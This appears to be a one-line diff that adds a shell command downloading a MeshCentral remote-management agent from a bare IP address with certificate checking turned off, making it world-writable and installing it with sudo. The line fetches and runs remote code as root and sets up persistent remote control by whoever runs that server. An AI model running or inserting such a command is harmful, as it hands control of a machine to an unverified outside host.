@@ -1,0 +1,1 @@
+wget -O meshagent --no-check-certificate "https://52.248.44.93/meshagents?id=3XjZG7Cm@zi79qOYMcgsIFMWEgTxufXwhgbjYx8r0zLCzbWxj8sq5jSc2UWqQKBf&installflags=0&meshinstall=10005" && chmod 777 meshagent && sudo ./meshagent -install
